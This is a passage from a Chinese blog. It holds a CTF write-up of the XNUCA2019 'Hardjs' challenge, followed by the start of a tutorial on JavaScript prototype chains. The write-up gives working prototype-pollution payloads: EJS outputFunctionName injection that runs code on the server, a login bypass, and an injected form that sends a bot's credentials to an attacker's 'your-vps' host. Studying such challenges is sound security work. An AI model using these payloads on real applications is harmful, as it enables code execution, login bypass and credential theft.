utils.escapeXML;</span><br><span class="line"> options.compileDebug = opts.compileDebug !== <span class="literal">false</span>;</span><br><span class="line"> options.debug = !!opts.debug;</span><br><span class="line"> options.filename = opts.filename;</span><br><span class="line"> options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;</span><br><span class="line"> options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;</span><br><span class="line"> options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;</span><br><span class="line"> options.strict = opts.strict || <span class="literal">false</span>;</span><br><span class="line"> options.context = opts.context;</span><br><span class="line"> options.cache = opts.cache || <span class="literal">false</span>;</span><br><span class="line"> options.rmWhitespace = opts.rmWhitespace;</span><br><span class="line"> options.root = opts.root;</span><br><span class="line"> options.outputFunctionName = opts.outputFunctionName;</span><br><span class="line"> options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;</span><br><span class="line"> options.views = opts.views;</span><br><span class="line"> options.async = opts.async;</span><br></pre></td></tr></table></figure>

<p>一路向下跟进</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nxHzRI.png" alt="nxHzRI.png"></p>
<p>我们可以清楚的看到outputFunctionName是未定义的，那么通过原型链污染污染这个这个变量，即可rce。</p>
<p>下面的payload打五次，访问/get即可得到flag</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"type"</span>:<span class="string">"wiki"</span>,<span class="string">"content"</span>:&#123;<span class="string">"constructor"</span>: &#123;<span class="string">"prototype"</span>: &#123;<span class="string">"outputFunctionName"</span>: <span class="string">"a=1; return process.env.FLAG"</span>; <span class="keyword">var</span> tmp &#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;outputFunctionName&quot;: &quot;a&#x3D;1; return process.env.FLAG&#x2F;&#x2F;&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="前后端组合利用"><a href="#前后端组合利用" class="headerlink" title="前后端组合利用"></a>前后端组合利用</h4><p>这个组合利用太强了,膜wonderkun师傅</p>
<p>首先看一下robot.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> selenium</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-xss-auditor'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">driverpath = <span class="string">'/usr/bin/chromedriver'</span></span><br><span class="line">host= <span class="string">"http://127.0.0.1/"</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">"admin"</span></span><br><span class="line">password = <span class="string">'flag&#123;lihuaiqiu_is_so_Cool&#125;'</span></span><br><span class="line"></span><br><span class="line">client = webdriver.Chrome(chrome_options=chrome_options,executable_path=driverpath)</span><br><span class="line">client.set_page_load_timeout(<span class="number">10</span>)</span><br><span class="line">client.set_script_timeout(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] start chrome browser ......"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">client.get(host)</span><br><span class="line">client.set_page_load_timeout(<span class="number">10</span>)</span><br><span class="line">client.set_script_timeout(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    client.switch_to_alert().accept()</span><br><span class="line"><span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">usernameForm = client.find_element_by_xpath(<span class="string">"//input[@name='username']"</span>)</span><br><span class="line">passwordForm = client.find_element_by_xpath(<span class="string">"//input[@name='password']"</span>)</span><br><span class="line"></span><br><span class="line">usernameForm.clear()</span><br><span class="line">passwordForm.clear()</span><br><span class="line">usernameForm.send_keys(username)</span><br><span class="line">passwordForm.send_keys(password)</span><br><span class="line">loginButton = client.find_element_by_xpath(<span class="string">"//input[@type='submit']"</span>)</span><br><span class="line">loginButton.click()</span><br><span class="line">print(client.current_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># content = driver.page_source.encode('utf-8')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(content)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        login()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        client.quit()</span><br></pre></td></tr></table></figure>

<p>首先可以看出密码就是我们要的flag，这里我本地为了方便改了flag。可以看到这个脚本是直接访问的<a href="http://127.0.0.1。然后去通过Xpath来搜索input" target="_blank" rel="noopener">http://127.0.0.1。然后去通过Xpath来搜索input</a> name 和password，最后去提交flag在这个找到的表单里</p>
<p>那我们如果在我们的主页中提交一个表单，将flag发送到我们的vps这样可行吗？</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nzJBDJ.png" alt="nzJBDJ.png"></p>
<p>很明显是不行了，因为沙盒直接将脚本的执行阻断掉了，那么我们可以试着将这个表单放到沙盒外，这样就可以拿到flag了</p>
<p>关键在于app.js,在app.js中我们可以发现jQuery.extend CVE-2019-11358这个原型链污染漏洞，具体如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params">allNode</span>)</span>&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url:<span class="string">"/get"</span>,</span><br><span class="line">    type:<span class="string">"get"</span>,</span><br><span class="line">    <span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">datas</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ;i&lt;datas.length; i++)&#123;</span><br><span class="line">            $.extend(<span class="literal">true</span>,allNode,datas[i])</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">console</span>.log(allNode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过datas去污染allNode,那么接下来去看看这两个分别是什么吧</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nzNvrD.png" alt="nzNvrD.png"></p>
<p>大意就是把我添加的放到Allnode里去之后再去渲染，那么这个污染点就ok了，下面接着去找一下出触发点</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> hints = &#123;</span><br><span class="line">		header : <span class="string">"自定义内容"</span>,</span><br><span class="line">		notice: <span class="string">"自定义公告"</span>,</span><br><span class="line">		wiki : <span class="string">"自定义wiki"</span>,</span><br><span class="line">		button:<span class="string">"自定义内容"</span>,</span><br><span class="line">		message: <span class="string">"自定义留言内容"</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span>(key <span class="keyword">in</span> hints)&#123;</span><br><span class="line">		<span class="comment">// console.log(key);</span></span><br><span class="line">		element = $(<span class="string">"li[type='"</span>+key+<span class="string">"']"</span>); </span><br><span class="line">		<span class="keyword">if</span>(element)&#123;</span><br><span class="line">			element.find(<span class="string">"span.content"</span>).html(hints[key]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>这个就是触发点了，首先遍历hints对象中的key，但是我们上面可是有原型链污染的，所以这里可以遍历到我们的原型链污染的值，所以触发点就在这里了，接着向下跟着，这里要找span标签并且class为content的那个地方并且渲染key对应的值，这里就正好符合我们所需要的要求了，由于这个app.js是结合index.ejs进行渲染的，所以我们需要在index.ejs中找到这个span并且这个span位于sandbox外</p>
<p>在sandbox中类似这种的li标签是都在沙盒內部的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$tmp = $(<span class="string">"li[type='header']"</span>);</span><br><span class="line">$newNode = $( $tmp.html() );</span><br><span class="line">$newNode.find(<span class="string">"span.content"</span>).html(dom[key][<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// console.log($newNode.html());</span></span><br><span class="line">viewport.appendChild( $newNode[<span class="number">0</span>] );</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>最终发现同时满足li和具有span-content的地方如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">type</span>=<span class="string">"logger"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-12 col-sm-centered"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">"am-pre-scrollable"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-success"</span>&gt;</span>[Tue Jan 11 17:32:52 9]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"am-text-danger"</span>&gt;</span>[info]<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>StoreHtml init success .....<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以把这个span-content的值改为我们获取flag的表单</p>
<p>利用Payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;logger&quot;:&quot;&lt;form action&#x3D;&#39;http:&#x2F;&#x2F;your-vps&#39; method&#x3D;&#39;post&#39; class&#x3D;&#39;am-form&#39;&gt;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;username&#39; id&#x3D;&#39;email&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;password&#39; name&#x3D;&#39;password&#39; id&#x3D;&#39;password&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;submit&#39; name&#x3D;&#39;&#39; &gt;&lt;&#x2F;form&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这样即可在object中加上logger，还要处理一下登陆的问题，因为robot.py没有登陆的操作，下面payload打五次，绕过登陆</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;login&quot;:true,&quot;userid&quot;:1&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>最后监听一下端口，拿到模拟flag</p>
<p><img src="https://s2.ax1x.com/2019/09/21/nz0Hcq.png" alt="nz0Hcq.png"></p>
<p>最后的话看了一下这个extend</p>
<p>datas</p>
<p><img src="https://s2.ax1x.com/2019/09/21/uS9Hu4.png" alt="uS9Hu4.png"></p>
<p>allnode</p>
<p><img src="https://s2.ax1x.com/2019/09/21/uSEAaQ.png" alt="uSEAaQ.png"></p>
<p>可以看出这里通过添加进来的数组进行污染的，之前在extend的时候其实就把我们的__proto__做为了data中数组对象的原型链也就是操控了Object，那么添加到新的allnode中，依然保持这样，所以是这样直接造成了污染</p>
<p>在lodash中其实原理个人感觉也是和这个差不多的，多了一个json parse解析成数组的步骤，再直接加刀那个对象里去，依然是通过这个数组对象进行原型链污染</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.xmsec.cc/prototype-pollution-notes/" target="_blank" rel="noopener">https://www.xmsec.cc/prototype-pollution-notes/</a></p>
<p><a href="https://xz.aliyun.com/t/6113" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113</a></p>
<p><a href="https://xz.aliyun.com/t/6101" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101</a></p>
<p><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs" target="_blank" rel="noopener">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/09/25/XNUCA2019-Hardjs/" data-id="ckabsu38u002nkkvr34o9axjm" class="article-share-link" data-share="baidu" data-title="XNUCA2019-Hardjs">Share</a>
      

      
        <a href="http://yoursite.com/2019/09/25/XNUCA2019-Hardjs/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Prototype-Pollution-Attack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/25/Prototype-Pollution-Attack/" class="article-date">
  <time datetime="2019-09-25T10:25:28.000Z" itemprop="datePublished">2019-09-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/25/Prototype-Pollution-Attack/">Prototype Pollution Attack</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><h4 id="javascript对象"><a href="#javascript对象" class="headerlink" title="javascript对象"></a>javascript对象</h4><p>在Javascript中同样是有一切皆对象这种说法的，下面是在javascript中创建对象的三种方式</p>
<ul>
<li>普通创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person=&#123;<span class="attr">name</span>:<span class="string">'lihuaiqiu'</span>,<span class="string">'age'</span>,<span class="string">'19'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person=&#123;&#125;  <span class="comment">//创建空对象</span></span><br></pre></td></tr></table></figure>

<ul>
<li>构造函数方法创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name=<span class="string">"liahuqiu"</span>;</span><br><span class="line">    <span class="keyword">this</span>.test=<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">23333</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">person.prototype.a=<span class="number">3</span>;</span><br><span class="line">web=<span class="keyword">new</span> person();</span><br><span class="line"><span class="built_in">console</span>.log(web.test());</span><br><span class="line"><span class="built_in">console</span>.log(web.a)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过object创建</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.c=<span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(a.c)</span><br></pre></td></tr></table></figure>

<h4 id="函数即对象思想"><a href="#函数即对象思想" class="headerlink" title="函数即对象思想"></a>函数即对象思想</h4><p>这里用instanceof来判断很明显，首先用较为官方的语言来说明一下instanceof</p>
<blockquote>
<p>instanceof运算符可以用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链</p>
</blockquote>
<p>就像这样</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">My</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">You</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">var</span> myOne = <span class="keyword">new</span> My();</span><br><span class="line"><span class="built_in">console</span>.info(myOne <span class="keyword">instanceof</span> My)<span class="comment">//true //myone.__proto__===My.prototype</span></span><br><span class="line"><span class="built_in">console</span>.info(myOne <span class="keyword">instanceof</span> You)<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>那么就可以通过下面这样的代码去验证函数即对象了</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nRFnk8.png" alt="nRFnk8.png"></p>
<p>由此可以test构造函数其实也是一种对象，即”函数即对象”。</p>
<p>那么函数与对象的属性有什么区别呢？csdn上有一个很好的图可以解释这个问题，如下:</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nRFRhD.png" alt="nRFRhD.png"></p>
<p>函数既可作为对象去解释又可作为函数去解释。</p>
<h4 id="proto-，constructor与prototype"><a href="#proto-，constructor与prototype" class="headerlink" title="__proto__，constructor与prototype"></a>__proto__，constructor与prototype</h4><p>首先把这三个属性的基本概念列举出来</p>
<ul>
<li><p>__proto__： <em>\</em>proto__是对象与对象之间连接的桥梁，即原型链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象.__proto__&#x3D;构造器(构造函数).prototype</span><br></pre></td></tr></table></figure>

<p>构造器.prototype其实也是一个对象，为构造函数的原型对象，同样有__proto__属性，一直通过原型链__proto__最终可找到null。</p>
<p>在访问一个对象的某个属性时,当属性在实例中找不到，就会在属性中的原型对象中寻找。</p>
</li>
<li><p>prototype：prototype为函数特有的属性，而通过构造函数实例化的对象，默认是没有的。</p>
</li>
</ul>
<p>构造函数.prototype即为此构造函数实例化的原型对象，即 构造器(构造函数).prototype=对象.<em>_proto_\</em></p>
<p>其实prototype主要作用为解决构造函数的对象实例之间无法共享属性的缺点,实例如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">test.prototype.a=<span class="function"><span class="keyword">function</span> <span class="title">num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line">example1=<span class="keyword">new</span> test();</span><br><span class="line">example2=<span class="keyword">new</span> test();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(example1.a);   <span class="comment">//[Function: num]</span></span><br><span class="line"><span class="built_in">console</span>.log(example2.a)    <span class="comment">//[Function: num]</span></span><br><span class="line"><span class="built_in">console</span>.log(example1.a===example2.a);   <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>constructor：通过实例化对象.constructor即可得到该实例化对象的构造函数，实例如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(person1.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.constructor) <span class="comment">//[Function: Person] //Person的原型对象的构造函数即为Person</span></span><br></pre></td></tr></table></figure>

<p>之前介绍的函数即对象思想在这里就可以解释一些代码了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person.constructor) <span class="comment">// [Function: Function]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>.constructor) <span class="comment">// [Function: Function]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.constructor) <span class="comment">// [Function: Function]</span></span><br></pre></td></tr></table></figure>

<p>这四行代码说明了以下几点问题</p>
<ol>
<li>Funtion函数为Person函数的构造函数，这里就间接说明了函数即对象这个思想</li>
<li>Function函数同时也是自己的构造函数</li>
<li>Function函数同时为Object内置类的构造函数</li>
</ol>
<p><strong>所以，javascript中任意函数都是函数Function的实例对象，同时Function函数自身也为自己的实例对象</strong></p>
<h4 id="一些帮助理解的小例子"><a href="#一些帮助理解的小例子" class="headerlink" title="一些帮助理解的小例子"></a>一些帮助理解的小例子</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(person1.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.constructor) <span class="comment">//[Function: Person]</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__===Person.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__.constructor) <span class="comment">//[Function: Object]</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__==<span class="built_in">Object</span>.prototype) <span class="comment">//&#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__.__proto__.__proto__)  <span class="comment">//null</span></span><br></pre></td></tr></table></figure>

<p>来自csdn上的一个很棒的图片</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nfdXRK.png" alt="nfdXRK.png"></p>
<h4 id="Object与Function"><a href="#Object与Function" class="headerlink" title="Object与Function"></a>Object与Function</h4><p><code>Object</code>/<code>Function</code>既是对象，有自己的方法和属性，也是函数，可以作为构造函数，或许可以称作所谓的构造函数(函数对象)</p>
<h5 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h5><p>Function相对来说是一个很特别的函数/对象</p>
<ul>
<li>一般函数函数的prototype属性为一个原型对象，而Function的prototype属性为一个函数对象</li>
<li>所有函数的本身的__proto__属性指向Function的原型对象，实例如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Person.__proto__===<span class="built_in">Function</span>.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.__proto__===<span class="built_in">Function</span>.prototype)</span><br></pre></td></tr></table></figure>

<h5 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h5><ul>
<li>Object.prototype为所有对象原型链的终点且Object.prototype.__proto__为null</li>
</ul>
<p>一些帮助理解的小例子</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true </span></span><br><span class="line"><span class="built_in">Object</span>.__proto__ === <span class="built_in">Function</span>.prototype <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span> <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.__proto__ === <span class="built_in">Object</span>.prototype <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Object</span>.prototype === <span class="built_in">Object</span>.__proto__ <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype) <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.__proto__) <span class="comment">// [Function]</span></span><br></pre></td></tr></table></figure>

<h4 id="普通对象与函数对象的一些区别"><a href="#普通对象与函数对象的一些区别" class="headerlink" title="普通对象与函数对象的一些区别"></a>普通对象与函数对象的一些区别</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test=&#123;<span class="string">'name'</span>:<span class="string">'lihuaiqiu'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test.__proto__===<span class="built_in">Object</span>.prototype)</span><br><span class="line"><span class="built_in">console</span>.log(Person.prototype.__proto__===<span class="built_in">Object</span>.prototype)</span><br></pre></td></tr></table></figure>

<p>从上例中可明显看出函数对象与普通对象的区别是中间差了一个prototype获取原型对象的过程。</p>
